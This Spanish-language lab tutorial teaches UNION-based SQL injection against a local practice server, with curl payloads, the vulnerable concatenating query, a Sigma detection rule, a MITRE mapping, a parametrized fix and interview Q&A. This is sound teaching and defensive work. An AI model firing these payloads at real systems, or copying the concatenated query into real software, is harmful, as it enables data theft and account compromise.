# 💉 SQL Injection (UNION-based)

> **Cuando la base de datos te devuelve columnas que nunca pediste.** Si la aplicacion pega tu texto directo dentro de una consulta SQL, podes agregar tu propio `SELECT` y hacer que la respuesta traiga datos de OTRAS tablas: secretos, hashes, todo.

> ⚠️ **Marco de trabajo:** esto se practica SOLO contra objetivos autorizados. Todo lo de abajo corre en el lab local de la comunidad, `vulnlab.py`, en tu propia maquina. Lanzar cualquiera de estos payloads contra un sistema que no es tuyo y sin permiso escrito es un delito. Aca aprendemos a atacar para saber defender.

---

## 1. Que es y por que importa

Una **inyeccion SQL** ocurre cuando una aplicacion construye una consulta a la base de datos **concatenando** texto que viene del usuario, en vez de tratarlo como un dato aislado. El motor SQL no distingue "lo que el programador escribio" de "lo que el atacante mando": ve una sola cadena de texto y la ejecuta entera.

La variante **UNION-based** es la mas visual y didactica: el operador `UNION` de SQL sirve para **pegar los resultados de dos consultas** en una misma respuesta. Si el endpoint te muestra los resultados de una consulta, podes anexar tu propio `SELECT` y hacer que la app te devuelva **cualquier columna de cualquier tabla** a la que el usuario de base de datos tenga acceso.

**Impacto real:**
- **Robo masivo de datos:** usuarios, emails, hashes de contrasenas, tokens, tarjetas.
- **Escalada:** con los hashes filtrados, se pasa a cracking offline (por ejemplo con `hashcat`) para recuperar contrasenas en claro.
- **Compromiso total:** segun el motor y los privilegios, puede derivar en lectura de archivos del sistema o ejecucion de comandos.

Es una de las vulnerabilidades mas antiguas y a la vez mas frecuentes en aplicaciones web. Entra directo en el **OWASP Top 10** como *Injection*.

---

## 2. Montar el lab

Instalá las dependencias y levantá el servidor vulnerable de la comunidad:

```bash
pip install flask requests lxml pyjwt && python3 vulnlab.py
```

El lab queda escuchando en **http://127.0.0.1:5000**.

**Endpoint de esta clase:**

```
GET /user?id=<valor>
```

Devuelve el `id` y el `username` del usuario cuyo id pediste. Es una busqueda de lo mas comun... y detras esconde una concatenacion insegura.

---

## 3. El ataque, paso a paso

### Paso 1 — Comportamiento normal (baseline)

Primero vemos como responde el endpoint con un uso legitimo:

```bash
curl "http://127.0.0.1:5000/user?id=1"
```

**Output real:**

```
(1, 'alice')
```

Pedimos el usuario `id=1` y nos devuelve `(1, 'alice')`. Todo normal. Ahora sabemos que la respuesta expone **dos columnas**: `id` y `username`. Ese numero — **2 columnas** — es la pieza clave para el siguiente paso.

### Paso 2 — Inyectar un UNION SELECT

Mandamos un `id` que no existe (`0`, para que la consulta original no devuelva nada) y le anexamos nuestra propia consulta con `UNION SELECT`, apuntando a la columna `secret`:

```bash
curl "http://127.0.0.1:5000/user?id=0 UNION SELECT secret, username FROM users"
```

**Output real:**

```
('FLAG{sqli_secret_del_admin}', 'admin')
(..., 'alice')
... (una fila por CADA usuario de la tabla: su columna `secret` y su `username`)
```

Extrajimos el **secreto del admin** que la aplicacion jamas quiso mostrar. El `id=0` no matchea a ningun usuario, asi que la **primera** consulta (`WHERE id = 0`) no aporta filas; **todas** las filas que suben a la respuesta vienen de nuestro `UNION SELECT`, que devuelve **una fila por cada usuario** de la tabla (`secret`, `username`). Entre ellas esta la del `admin`, con el `FLAG{...}`.

### ¿Por que funciona?

**El codigo vulnerable** del endpoint es este:

```python
# /user?id=<uid>
execute("SELECT id, username FROM users WHERE id = " + uid)
```

El valor `uid` que viene del parametro `?id=` se **concatena** con `+` directo dentro de la cadena SQL. Cuando mandamos:

```
uid = 0 UNION SELECT secret, username FROM users
```

la consulta que realmente ejecuta el motor pasa a ser:

```sql
SELECT id, username FROM users WHERE id = 0 UNION SELECT secret, username FROM users
```

El motor ve **dos** `SELECT` unidos por `UNION` y ejecuta ambos. La primera mitad (`WHERE id = 0`) no devuelve filas; la segunda mitad devuelve la columna `secret` de **todos** los usuarios, incluido el admin.

**Conceptos reusables que te llevas:**

1. **Concatenar input a una query = inyeccion.** No importa el lenguaje ni el motor: si el dato del usuario termina siendo *parte del codigo* SQL, es explotable.
2. **UNION anexa filas de otras columnas/tablas.** Con una regla estricta: **el numero de columnas del `SELECT` inyectado tiene que coincidir** con el de la consulta original (aca eran **2**: `secret, username` para calzar con `id, username`). Si no coinciden, el motor tira error.
3. **Descubrir el numero de columnas** es el primer trabajo del atacante (aca fue trivial: la respuesta baseline ya mostraba 2 valores).

---

## 4. Blue Team

### Firma de deteccion

Buscá en logs de aplicacion, WAF y consultas SQL estos indicadores en parametros de entrada:

- La cadena **`UNION SELECT`** (con o sin espacios/comentarios entre medio).
- Tautologias tipo **`OR 1=1`**.
- **Comillas** (`'`, `"`) sueltas en parametros que deberian ser numericos.
- **Errores SQL** devueltos en el cuerpo de la respuesta (fuga de estructura de la base).

Un parametro `id` que deberia ser un entero y de golpe contiene palabras clave de SQL es una senal fuerte de tanteo o explotacion.

### Regla Sigma

```yaml
title: Posible SQL Injection UNION-based en parametros web
id: 6f3a9c1e-8b42-4d7a-9e5f-2c1a0b6d4e7f
status: experimental
description: Detecta payloads de SQLi UNION-based y tautologias en parametros de peticiones HTTP
logsource:
  category: webserver
detection:
  selection_union:
    cs-uri-query|contains|all:
      - 'UNION'
      - 'SELECT'
  selection_tautology:
    cs-uri-query|contains:
      - 'OR 1=1'
      - "' OR '"
      - '1=1'
  condition: selection_union or selection_tautology
fields:
  - c-ip
  - cs-uri-query
  - cs-user-agent
falsepositives:
  - Aplicaciones legitimas que reciben SQL como dato (raro; revisar caso por caso)
level: high
```

> Nota: el matching de `contains` en Sigma es **case-insensitive**, asi que tambien detecta `union select`, `Union Select`, etc. El campo del query string es `cs-uri-query` (client-to-server) segun el formato de log W3C/IIS.

### Mapeo MITRE ATT&CK

| Tactica | Tecnica | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | **T1190** |

La explotacion de una vulnerabilidad en una aplicacion expuesta a internet (como este SQLi) cae directo en **T1190**.

### Mitigacion (el fix correcto)

| Problema | Fix |
|---|---|
| Concatenar input a la query | **Consultas parametrizadas / prepared statements.** El dato viaja separado del codigo SQL, nunca como parte de la consulta. |
| Construir SQL a mano | Usar un **ORM** que parametrice por defecto. |
| Usuario de DB todopoderoso | **Minimo privilegio:** el usuario de la app solo lee lo que necesita; nada de acceso a tablas de secretos. |
| Errores SQL filtrados al cliente | **No exponer errores SQL** en la respuesta; loguearlos internamente y devolver un error generico. |

**El codigo corregido:**

```python
# En vez de concatenar:
#   execute("SELECT id, username FROM users WHERE id = " + uid)   # VULNERABLE

# Parametrizado (el driver escapa/separa el valor por vos):
execute("SELECT id, username FROM users WHERE id = ?", (uid,))
```

Con el placeholder `?`, el valor `0 UNION SELECT secret, username FROM users` se trata como **un unico string de id**, la consulta no encuentra ningun usuario con ese "id" literal, y no se ejecuta ningun `UNION`. El ataque muere.

> **Nota de escalada defensiva:** si un SQLi llega a filtrar hashes de contrasenas, el atacante los lleva a cracking offline con herramientas como **hashcat**. Por eso el minimo privilegio y el hashing fuerte (bcrypt/argon2 con salt) son la segunda linea de defensa cuando la primera falla.

---

## 5. Q&A de entrevista

**1. ¿Por que en el payload UNION hay que igualar el numero de columnas?**
Porque `UNION` combina los resultados de dos consultas en un solo conjunto, y SQL exige que ambos `SELECT` tengan la **misma cantidad de columnas** (y tipos compatibles). Si la consulta original devuelve 2 columnas, tu `SELECT` inyectado tambien tiene que devolver 2, o el motor rechaza la consulta con error. En el lab usamos `SELECT secret, username` (2 columnas) para calzar con `SELECT id, username`.

**2. ¿Cual es la diferencia entre UNION-based y blind SQLi?**
En **UNION-based** los datos extraidos aparecen directamente en la respuesta de la aplicacion (como el `FLAG{...}` que vimos). En **blind SQLi** la app no muestra el resultado de la consulta; el atacante infiere los datos bit a bit observando cambios de comportamiento (respuestas verdadero/falso) o tiempos de respuesta. UNION-based es mas rapido y directo cuando la salida es visible.

**3. ¿Por que las prepared statements frenan la inyeccion y no basta con "filtrar comillas"?**
Porque las prepared statements **separan el codigo del dato a nivel de protocolo**: la estructura de la consulta se envia primero al motor y el valor viaja aparte, imposible de reinterpretar como SQL. El filtrado de caracteres (blacklisting) es fragil: siempre aparecen bypasses (codificaciones, comentarios, funciones alternativas). La parametrizacion elimina la clase entera de bug de raiz, no caso por caso.

**4. Vulneraste un endpoint y filtraste hashes de contrasenas. ¿Que sigue y como se defiende el equipo azul?**
Ofensiva: se pasan los hashes a **cracking offline** (por ejemplo `hashcat`) para recuperar contrasenas en claro y hacer credential stuffing o escalar. Defensa: **minimo privilegio** para que la cuenta de la app ni siquiera pueda leer la tabla de credenciales; **hashing fuerte con salt** (bcrypt/argon2) para que crackear sea inviable; y **deteccion temprana** del `UNION SELECT` en los logs (la regla Sigma de arriba) para cortar el ataque antes de la exfiltracion masiva.